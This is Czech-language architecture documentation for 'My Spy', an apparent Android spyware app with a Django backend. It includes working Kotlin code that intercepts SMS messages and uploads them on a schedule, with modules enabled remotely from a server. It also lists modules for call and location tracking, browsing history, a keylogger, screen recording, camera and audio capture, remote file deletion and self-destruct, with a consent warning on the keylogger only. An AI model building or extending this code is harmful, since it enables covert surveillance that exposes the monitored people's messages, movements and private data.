# My Spy - Dokumentace modulární architektury

**Autor:** Michael KOJDL
**Verze:** 1.0.0
**Poslední revize:** 2025-10-30

---

## Obsah

1. [Úvod do modulární architektury](#úvod-do-modulární-architektury)
2. [Base Module Pattern](#base-module-pattern)
3. [Lifecycle modulu](#lifecycle-modulu)
4. [Konfigurace modulů](#konfigurace-modulů)
5. [Inter-module Communication](#inter-module-communication)
6. [Přidání nového modulu](#přidání-nového-modulu)
7. [Dostupné moduly](#dostupné-moduly)

---

## Úvod do modulární architektury

My Spy používá modulární architekturu umožňující:

- ✅ **Nezávislé zapínání/vypínání** jednotlivých funkcí
- ✅ **Hot-swapping** - změna konfigurace za běhu
- ✅ **Snadné rozšiřování** - přidání nových modulů
- ✅ **Testovatelnost** - každý modul lze testovat samostatně
- ✅ **Customizace** - uživatel volí které moduly chce

### Architektura

```
┌─────────────────────────────────────────────────┐
│              Module Manager                      │
│  - Module lifecycle                              │
│  - Configuration management                      │
│  - Inter-module messaging                        │
└──────────────┬──────────────────────────────────┘
               │
    ┌──────────┴──────────┐
    │                     │
┌───▼────┐           ┌───▼────┐
│ Module │           │ Module │
│   A    │◄─────────►│   B    │
└────────┘           └────────┘
    │
    ├─ Data Collection
    ├─ Data Processing
    ├─ Data Upload
    └─ Event Handling
```

---

## Base Module Pattern

### BaseModule Interface

```kotlin
/**
 * Base Module Interface
 *
 * @author Michael KOJDL
 * @version 1.0.0
 * @revision 2025-10-30
 *
 * @description Základní rozhraní pro všechny monitoring moduly
 */
abstract class BaseModule(
    protected val context: Context,
    protected val moduleId: String
) {
    // Module metadata
    abstract val moduleName: String
    abstract val moduleDescription: String
    abstract val moduleVersion: String

    // Module state
    protected var isInitialized = false
    protected var isRunning = false

    // Configuration
    protected lateinit var config: ModuleConfig

    /**
     * Initialize module
     * Volá se při startu aplikace nebo při aktivaci modulu
     */
    open suspend fun initialize(config: ModuleConfig): Result<Unit> {
        this.config = config
        isInitialized = true
        return Result.success(Unit)
    }

    /**
     * Start module monitoring
     * Spustí monitoring funkcionalitu
     */
    abstract suspend fun start(): Result<Unit>

    /**
     * Stop module monitoring
     * Zastaví monitoring funkcionalitu
     */
    abstract suspend fun stop(): Result<Unit>

    /**
     * Update module configuration
     * Aktualizuje konfiguraci za běhu
     */
    open suspend fun updateConfig(newConfig: ModuleConfig): Result<Unit> {
        this.config = newConfig
        // Restart s novou konfigurací
        if (isRunning) {
            stop()
            start()
        }
        return Result.success(Unit)
    }

    /**
     * Get module status
     * Vrací aktuální stav modulu
     */
    open fun getStatus(): ModuleStatus {
        return ModuleStatus(
            moduleId = moduleId,
            moduleName = moduleName,
            isEnabled = config.enabled,
            isRunning = isRunning,
            lastSync = getLastSyncTime(),
            pendingItems = getPendingItemsCount()
        )
    }

    /**
     * Cleanup resources
     * Uvolní resources při shutdown
     */
    open suspend fun cleanup() {
        if (isRunning) {
            stop()
        }
        isInitialized = false
    }

    // Helpers
    protected abstract fun getLastSyncTime(): Long?
    protected abstract fun getPendingItemsCount(): Int
}
```

### ModuleConfig

```kotlin
/**
 * Module Configuration
 */
data class ModuleConfig(
    val moduleId: String,
    val enabled: Boolean,
    val settings: Map<String, Any> = emptyMap()
) {
    inline fun <reified T> getSetting(key: String, default: T): T {
        return (settings[key] as? T) ?: default
    }
}
```

### ModuleStatus

```kotlin
/**
 * Module Status
 */
data class ModuleStatus(
    val moduleId: String,
    val moduleName: String,
    val isEnabled: Boolean,
    val isRunning: Boolean,
    val lastSync: Long?,
    val pendingItems: Int,
    val error: String? = null
)
```

---

## Lifecycle modulu

### Stavy modulu

```
┌──────────┐
│   NOT    │
│INITIALIZED│
└────┬─────┘
     │ initialize()
     ▼
┌──────────┐
│INITIALIZED│
└────┬─────┘
     │ start()
     ▼
┌──────────┐     stop()     ┌──────────┐
│ RUNNING  │◄───────────────┤ STOPPED  │
└────┬─────┘                └────┬─────┘
     │ stop()                     │ start()
     └────────────────────────────┘
              │
              │ cleanup()
              ▼
         ┌──────────┐
         │DESTROYED │
         └──────────┘
```

### Příklad implementace (SMS Module)

```kotlin
/**
 * SMS Module Implementation
 *
 * @author Michael KOJDL
 * @version 1.0.0
 * @revision 2025-10-30
 */
class SmsModule(
    context: Context,
    private val smsRepository: SmsRepository,
    private val uploadService: UploadService
) : BaseModule(context, MODULE_ID) {

    companion object {
        const val MODULE_ID = "sms_monitoring"
    }

    override val moduleName = "SMS Monitoring"
    override val moduleDescription = "Monitors SMS messages"
    override val moduleVersion = "1.0.0"

    private var contentObserver: ContentObserver? = null
    private var broadcastReceiver: BroadcastReceiver? = null

    override suspend fun initialize(config: ModuleConfig): Result<Unit> {
        return try {
            super.initialize(config)

            // Check permissions
            if (!hasRequiredPermissions()) {
                return Result.failure(Exception("Missing SMS permissions"))
            }

            // Initialize repository
            smsRepository.initialize()

            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    override suspend fun start(): Result<Unit> {
        return try {
            if (!isInitialized) {
                return Result.failure(Exception("Module not initialized"))
            }

            // Register content observer
            registerContentObserver()

            // Register broadcast receiver
            registerBroadcastReceiver()

            // Start upload worker
            startUploadWorker()

            isRunning = true
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    override suspend fun stop(): Result<Unit> {
        return try {
            // Unregister observers
            contentObserver?.let {
                context.contentResolver.unregisterContentObserver(it)
            }

            // Unregister receiver
            broadcastReceiver?.let {
                context.unregisterReceiver(it)
            }

            // Stop upload worker
            stopUploadWorker()

            isRunning = false
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    private fun registerContentObserver() {
        contentObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean) {
                super.onChange(selfChange)
                // Handle SMS change
                onSmsChanged()
            }
        }

        context.contentResolver.registerContentObserver(
            Telephony.Sms.CONTENT_URI,
            true,
            contentObserver!!
        )
    }

    private fun registerBroadcastReceiver() {
        broadcastReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                when (intent.action) {
                    Telephony.Sms.Intents.SMS_RECEIVED_ACTION -> {
                        onSmsReceived(intent)
                    }
                }
            }
        }

        val filter = IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)
        context.registerReceiver(broadcastReceiver, filter)
    }

    private fun onSmsChanged() {
        // Asynchronně zpracovat změnu
        CoroutineScope(Dispatchers.IO).launch {
            val newSms = smsRepository.getNewSms()
            newSms.forEach { sms ->
                smsRepository.save(sms)
            }
        }
    }

    private fun onSmsReceived(intent: Intent) {
        // Real-time zpracování přijaté SMS
        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        messages.forEach { message ->
            val sms = SmsMessage(
                type = "INCOMING",
                address = message.displayOriginatingAddress,
                body = message.messageBody,
                timestamp = message.timestampMillis
            )
            CoroutineScope(Dispatchers.IO).launch {
                smsRepository.save(sms)
            }
        }
    }

    private fun startUploadWorker() {
        val uploadInterval = config.getSetting("uploadInterval", 300000L)
        val uploadRequest = PeriodicWorkRequestBuilder<SmsUploadWorker>(
            uploadInterval,
            TimeUnit.MILLISECONDS
        ).build()

        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            "sms_upload",
            ExistingPeriodicWorkPolicy.REPLACE,
            uploadRequest
        )
    }

    private fun stopUploadWorker() {
        WorkManager.getInstance(context).cancelUniqueWork("sms_upload")
    }

    override fun getLastSyncTime(): Long? {
        return smsRepository.getLastSyncTime()
    }

    override fun getPendingItemsCount(): Int {
        return smsRepository.getPendingCount()
    }

    private fun hasRequiredPermissions(): Boolean {
        return ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED &&
        ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.RECEIVE_SMS
        ) == PackageManager.PERMISSION_GRANTED
    }
}
```

---

## Konfigurace modulů

### Server-side konfigurace

Konfigurace modulů se ukládá na serveru a stahuje při startu aplikace nebo změně.

**API Endpoint:** `GET /api/v1/devices/{uuid}/config`

**Response:**
```json
{
  "modules": [
    {
      "module_id": "sms_monitoring",
      "enabled": true,
      "settings": {
        "monitorIncoming": true,
        "monitorOutgoing": true,
        "uploadInterval": 300000,
        "maxBatchSize": 100
      }
    },
    {
      "module_id": "location_tracking",
      "enabled": true,
      "settings": {
        "updateInterval": 600000,
        "minDistance": 50,
        "highAccuracy": true
      }
    },
    {
      "module_id": "keylogger",
      "enabled": false,
      "settings": {}
    }
  ],
  "version": "1.0.0",
  "updated_at": "2025-10-30T12:34:56.789Z"
}
```

### Module Manager

```kotlin
/**
 * Module Manager
 * Spravuje lifecycle všech modulů
 */
class ModuleManager(
    private val context: Context,
    private val apiClient: ApiClient
) {
    private val modules = mutableMapOf<String, BaseModule>()
    private val scope = CoroutineScope(Dispatchers.Default + SupervisorJob())

    init {
        // Register all available modules
        registerModule(SmsModule(context, smsRepository, uploadService))
        registerModule(CallsModule(context, callsRepository, uploadService))
        registerModule(LocationModule(context, locationRepository, uploadService))
        // ... další moduly
    }

    fun registerModule(module: BaseModule) {
        modules[module.moduleId] = module
    }

    suspend fun initializeAll() {
        // Fetch config from server
        val config = apiClient.getDeviceConfig()

        config.modules.forEach { moduleConfig ->
            modules[moduleConfig.moduleId]?.let { module ->
                module.initialize(moduleConfig)

                if (moduleConfig.enabled) {
                    module.start()
                }
            }
        }
    }

    suspend fun updateModuleConfig(moduleId: String, newConfig: ModuleConfig) {
        modules[moduleId]?.updateConfig(newConfig)
    }

    suspend fun enableModule(moduleId: String) {
        modules[moduleId]?.let { module ->
            if (!module.isRunning) {
                module.start()
            }
        }
    }

    suspend fun disableModule(moduleId: String) {
        modules[moduleId]?.let { module ->
            if (module.isRunning) {
                module.stop()
            }
        }
    }

    fun getAllStatus(): List<ModuleStatus> {
        return modules.values.map { it.getStatus() }
    }

    suspend fun cleanup() {
        modules.values.forEach { it.cleanup() }
    }
}
```

---

## Inter-module Communication

### Event Bus Pattern

```kotlin
/**
 * Module Event Bus
 * Umožňuje komunikaci mezi moduly
 */
object ModuleEventBus {
    private val events = MutableSharedFlow<ModuleEvent>()

    suspend fun emit(event: ModuleEvent) {
        events.emit(event)
    }

    fun subscribe(): Flow<ModuleEvent> = events.asSharedFlow()
}

sealed class ModuleEvent {
    data class ConfigUpdated(val moduleId: String, val config: ModuleConfig) : ModuleEvent()
    data class DataCollected(val moduleId: String, val dataType: String, val count: Int) : ModuleEvent()
    data class Error(val moduleId: String, val error: Exception) : ModuleEvent()
}
```

### Příklad použití

```kotlin
// Module A - emit event
ModuleEventBus.emit(
    ModuleEvent.DataCollected(
        moduleId = "sms_monitoring",
        dataType = "sms",
        count = 10
    )
)

// Module B - subscribe to events
ModuleEventBus.subscribe()
    .filter { it is ModuleEvent.DataCollected }
    .collect { event ->
        val dataEvent = event as ModuleEvent.DataCollected
        // Handle event
    }
```

---

## Přidání nového modulu

### Krok 1: Vytvořit modul class

```kotlin
class MyNewModule(
    context: Context,
    private val repository: MyRepository
) : BaseModule(context, "my_new_module") {

    override val moduleName = "My New Module"
    override val moduleDescription = "Description of my module"
    override val moduleVersion = "1.0.0"

    override suspend fun start(): Result<Unit> {
        // Implementace start logiky
        return Result.success(Unit)
    }

    override suspend fun stop(): Result<Unit> {
        // Implementace stop logiky
        return Result.success(Unit)
    }

    override fun getLastSyncTime(): Long? = repository.getLastSync()
    override fun getPendingItemsCount(): Int = repository.getPendingCount()
}
```

### Krok 2: Registrovat v Module Manager

```kotlin
class ModuleManager(context: Context, apiClient: ApiClient) {
    init {
        // ... existing modules
        registerModule(MyNewModule(context, myRepository))
    }
}
```

### Krok 3: Server-side konfigurace

Přidat konfiguraci do Django:

```python
# apps/devices/models.py
class ModuleConfig(models.Model):
    device = models.ForeignKey(Device, on_delete=models.CASCADE)
    module_id = models.CharField(max_length=50)
    enabled = models.BooleanField(default=False)
    settings = models.JSONField(default=dict)

    class Meta:
        unique_together = ['device', 'module_id']
```

### Krok 4: Dashboard widget

Vytvořit widget pro zobrazení dat modulu:

```python
# apps/dashboard/widgets/my_module_widget.py
class MyModuleWidget(BaseWidget):
    widget_id = 'my_module_widget'
    widget_name = 'My Module Data'
    template_name = 'widgets/my_module.html'

    def get_context_data(self, device, **kwargs):
        data = MyModuleData.objects.filter(device=device)
        return {
            'data': data,
            'count': data.count()
        }
```

---

## Dostupné moduly

### 1. SMS Module
- **ID:** `sms_monitoring`
- **Funkce:** Monitoring SMS zpráv
- **Konfigurace:** uploadInterval, maxBatchSize

### 2. Calls Module
- **ID:** `calls_monitoring`
- **Funkce:** Monitoring hovorů
- **Konfigurace:** uploadInterval, maxBatchSize

### 3. Location Module
- **ID:** `location_tracking`
- **Funkce:** GPS tracking
- **Konfigurace:** updateInterval, minDistance, highAccuracy

### 4. Apps Module
- **ID:** `apps_monitoring`
- **Funkce:** Monitoring používaných aplikací
- **Konfigurace:** checkInterval, uploadInterval, blockedApps

### 5. Internet Module
- **ID:** `internet_monitoring`
- **Funkce:** Browser history monitoring
- **Konfigurace:** uploadInterval, blockedDomains, useVpn

### 6. Keylogger Module
- **ID:** `keylogger`
- **Funkce:** Keylogger a touch tracking
- **Konfigurace:** uploadInterval, excludeApps, trackTouches
- **⚠️ WARNING:** Vyžaduje explicitní souhlas!

### 7. Screen Module
- **ID:** `screen_monitoring`
- **Funkce:** Screenshots a screen recording
- **Konfigurace:** screenshotInterval, recordingEnabled, quality

### 8. Media Module
- **ID:** `media_monitoring`
- **Funkce:** Camera a audio capture
- **Konfigurace:** cameraEnabled, audioEnabled, schedule

### 9. Files Module
- **ID:** `files_monitoring`
- **Funkce:** Remote file browser
- **Konfigurace:** allowDelete, allowModify, maxUploadSize

### 10. Remote Control Module
- **ID:** `remote_control`
- **Funkce:** Remote control commands
- **Konfigurace:** allowSelfDestruct, allowDisplayControl

---

## Module Dependencies

```
ModuleManager
├── SmsModule
│   ├── SmsRepository
│   └── UploadService
├── CallsModule
│   ├── CallsRepository
│   └── UploadService
├── LocationModule
│   ├── LocationRepository
│   ├── UploadService
│   └── GeocodingService
└── ...
```

---

**Autor:** Michael KOJDL
**Poslední aktualizace:** 2025-10-30
**Verze:** 1.0.0
